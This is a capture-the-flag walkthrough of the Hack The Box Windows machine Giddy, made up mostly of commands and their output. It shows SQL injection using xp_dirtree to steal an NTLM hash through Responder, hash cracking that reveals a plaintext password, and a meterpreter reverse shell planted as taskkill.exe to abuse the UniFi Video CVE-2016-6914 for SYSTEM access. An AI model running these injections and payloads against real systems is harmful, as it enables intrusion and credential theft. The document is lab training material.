| Category          | Details                                                                                                    |
|-------------------|------------------------------------------------------------------------------------------------------------|
| 📝 **Name**       | [Giddy](https://app.hackthebox.com/machines/Giddy)                                                         |  
| 🏷 **Type**       | HTB Machine                                                                                                |
| 🖥 **OS**         | Windows                                                                                                    |
| 🎯 **Difficulty** | Medium                                                                                                     |
| 📁 **Tags**       | SQLi, NTLM hash steal via EXEC xp_dirtree, [CVE-2016-6914](https://nvd.nist.gov/vuln/detail/CVE-2016-6914) |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ nmap -sS -sC -sV $TARGET    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-10 14:14 +0200
Stats: 0:01:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.77% done; ETC: 14:15 (0:00:00 remaining)
Nmap scan report for 10.129.44.26
Host is up (0.032s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
443/tcp  open  ssl/https?
|_ssl-date: 2026-05-10T12:15:58+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=PowerShellWebAccessTestWebSite
| Not valid before: 2018-06-16T21:28:55
|_Not valid after:  2018-09-14T21:28:55
| tls-alpn: 
|   h2
|_  http/1.1
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Giddy
| Not valid before: 2026-05-09T11:58:28
|_Not valid after:  2026-11-08T11:58:28
| rdp-ntlm-info: 
|   Target_Name: GIDDY
|   NetBIOS_Domain_Name: GIDDY
|   NetBIOS_Computer_Name: GIDDY
|   DNS_Domain_Name: Giddy
|   DNS_Computer_Name: Giddy
|   Product_Version: 10.0.14393
|_  System_Time: 2026-05-10T12:14:49+00:00
|_ssl-date: 2026-05-10T12:15:58+00:00; +3s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 110.44 seconds
```

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ feroxbuster --url http://$TARGET/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt                           <SNIP>
301      GET        2l       10w      147c http://10.129.44.26/mvc => http://10.129.44.26/mvc/
<SNIP>
```

#### Discover SQLi `/mvc/Product.aspx?ProductSubCategoryId` GET parameter
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ curl http://$TARGET/mvc/Product.aspx?ProductSubCategoryId=%27   
<SNIP>
<!-- 
[SqlException]: Unclosed quotation mark after the character string &#39;&#39;.
Incorrect syntax near &#39;&#39;.
   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection, Action`1 wrapCloseInAction)
   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning(TdsParserStateObject stateObj, Boolean callerHasConnectionLock, Boolean asyncClose)
   at System.Data.SqlClient.TdsParser.TryRun(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj, Boolean& dataReady)
   at System.Data.SqlClient.SqlDataReader.TryConsumeMetaData()
   at System.Data.SqlClient.SqlDataReader.get_MetaData()
   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString, Boolean isInternal, Boolean forDescribeParameterEncryption)
   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async, Int32 timeout, Task& task, Boolean asyncWrite, Boolean inRetry, SqlDataReader ds, Boolean describeParameterEncryptionRequest)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, TaskCompletionSource`1 completion, Int32 timeout, Task& task, Boolean& usedCache, Boolean asyncWrite, Boolean inRetry)
   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)
   at System.Data.SqlClient.SqlCommand.ExecuteReader()
   at _1_Injection.Product.Page_Load(Object sender, EventArgs e) in C:\Users\jnogueira\Downloads\owasp10\1-owasp-top10-m1-injection-exercise-files\before\1-Injection\Product.aspx.cs:line 25
   at System.Web.UI.Control.OnLoad(EventArgs e)
   at System.Web.UI.Control.LoadRecursive()
   at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
[HttpUnhandledException]: Exception of type &#39;System.Web.HttpUnhandledException&#39; was thrown.
   at System.Web.UI.Page.HandleError(Exception e)
   at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
   at System.Web.UI.Page.ProcessRequest(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)
   at System.Web.UI.Page.ProcessRequest()
   at System.Web.UI.Page.ProcessRequest(HttpContext context)
   at ASP.product_aspx.ProcessRequest(HttpContext context) in c:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\mvc\1e7e21cb\8f5621e8\App_Web_mfcoeeui.4.cs:line 0
   at System.Web.HttpApplication.CallHandlerExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
   at System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step)
   at System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean& completedSynchronously)
-->
<SNIP> 
```
Enumeration with `sqlmap` did not yield immediate results, e.g. `Users` table were empty. We will pivot towards injecting `EXEC xp_dirtree` to access attacker SMB share to steal NTLM hash with `responder`.

#### Start `reponder` to intercept SMB network traffic
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ sudo responder -I tun0
<SNIP>
    SMB server                 [ON]
<SNIP>
[+] Listening for events... 
```

#### Inject `EXEC xp_dirtree` to trigger SMB request
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ curl -s "http://$TARGET/mvc/Product.aspx?ProductSubCategoryId=1;DECLARE%20@p%20varchar(255);SET%20@p=0x5c5c31302e31302e31362e3139335c7368617265;EXEC%20xp_dirtree%20@p--" -o /dev/null
```

#### Capture NTLM hash for `GIDDY\Stacy`
```
[SMB] NTLMv2-SSP Client   : 10.129.44.26
[SMB] NTLMv2-SSP Username : GIDDY\Stacy
[SMB] NTLMv2-SSP Hash     : Stacy::GIDDY:ac996953bf557956:E9987D7CFDDBAD8DE8FF07A7636D3FC2:010100000000000080AD1DD51FE1DC01C9FFF629FE84EA370000000002000800480034004A00450001001E00570049004E002D003400350036003100480039005100440042004B00370004003400570049004E002D003400350036003100480039005100440042004B0037002E00480034004A0045002E004C004F00430041004C0003001400480034004A0045002E004C004F00430041004C0005001400480034004A0045002E004C004F00430041004C000700080080AD1DD51FE1DC01060004000200000008003000300000000000000000000000003000003FFA14DD99477AAB5422AC932FB4E4C17EEAF477863E8BB1E53C7168445ECDBF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310039003300000000000000000000000000
```

#### Break hash using `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ hashcat -m 5600 'Stacy::GIDDY:ac996953bf557956:E9987D7CFDDBAD8DE8FF07A7636D3FC2:010100000000000080AD1DD51FE1DC01C9FFF629FE84EA370000000002000800480034004A00450001001E00570049004E002D003400350036003100480039005100440042004B00370004003400570049004E002D003400350036003100480039005100440042004B0037002E00480034004A0045002E004C004F00430041004C0003001400480034004A0045002E004C004F00430041004C0005001400480034004A0045002E004C004F00430041004C000700080080AD1DD51FE1DC01060004000200000008003000300000000000000000000000003000003FFA14DD99477AAB5422AC932FB4E4C17EEAF477863E8BB1E53C7168445ECDBF0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E00310039003300000000000000000000000000' /usr/share/wordlists/rockyou.txt --quiet
STACY::GIDDY:ac996953bf557956:e9987d7cfddbad8de8ff07a7636d3fc2:010100000000000080ad1dd51fe1dc01c9fff629fe84ea370000000002000800480034004a00450001001e00570049004e002d003400350036003100480039005100440042004b00370004003400570049004e002d003400350036003100480039005100440042004b0037002e00480034004a0045002e004c004f00430041004c0003001400480034004a0045002e004c004f00430041004c0005001400480034004a0045002e004c004f00430041004c000700080080ad1dd51fe1dc01060004000200000008003000300000000000000000000000003000003ffa14dd99477aab5422ac932fb4e4c17eeaf477863e8bb1e53c7168445ecdbf0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310036002e00310039003300000000000000000000000000:xNnWo6272k7x
```

#### Access target over WinRM using `Stacy:xNnWo6272k7x`
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ evil-winrm -i $TARGET -u 'Stacy' -p xNnWo6272k7x
<SNIP>
*Evil-WinRM* PS C:\Users\Stacy\Documents> whoami
giddy\stacy
```

#### Capture user flag
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> cat C:\Users\Stacy\Desktop\user.txt
48ea492a9c83d98d1091d9cffa12efd0
```

### Root flag

#### Discover Ubiquiti UniFi Video service running on target
Service has been discovered with `winPEAS.exe`
```
=================================================================================================
Ubiquiti UniFi Video(Ubiquiti Networks, Inc. - Ubiquiti UniFi Video)[C:\ProgramData\unifi-video\avService.exe //RS//UniFiVideoService] - Autoload - No quotes and Space detected
    Possible DLL Hijacking in binary folder: C:\ProgramData\unifi-video (Users [Allow: WriteData/CreateFiles])
    Ubiquiti UniFi Video Service
=================================================================================================
```

#### Grep `server.log` to check UniFi Video version
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> cat C:\ProgramData\unifi-video\logs\server.log | findstr unifi-video
1529200541.430 2018-06-16 21:55:41.430/EDT: INFO   unifi-video v3.7.3 cmd: start in main
```
Version 3.7.2 is vulnerable to [CVE-2016-6914](https://nvd.nist.gov/vuln/detail/CVE-2016-6914).

#### Generate `windows/x64/meterpreter/reverse_tcp` reverse shell host it via SMB
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe && \
impacket-smbserver share . -smb2support
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Giddy]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT $LPORT; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.193:4444 
```

#### Deliver reverse shell to `C:\ProgramData\unifi-video\taskkill.exe` over SMB share
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> net use \\10.10.16.193\share
Local name
Remote name       \\10.10.16.193\share
Resource type     Disk
Status            Disconnected
# Opens           0
# Connections     1
The command completed successfully.

*Evil-WinRM* PS C:\Users\Stacy\Documents> copy \\10.10.16.193\share\shell.exe C:\ProgramData\unifi-video\taskkill.exe
```

#### Stop UniFi Video service to trigger reverse shell connection
```
*Evil-WinRM* PS C:\Users\Stacy\Documents> sc.exe stop UniFiVideoService

SERVICE_NAME: UniFiVideoService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x2
        WAIT_HINT          : 0xbb8
```

#### Confirm escalation
```
[*] Sending stage (230982 bytes) to 10.129.44.26
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.129.44.26:49726) at 2026-05-12 11:15:04 +0200

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### Capture root flag
```
meterpreter > cat C:\\Users\\Administrator\\Desktop\\root.txt
16eadf9e1147438be1a780dc60d37c2f
```
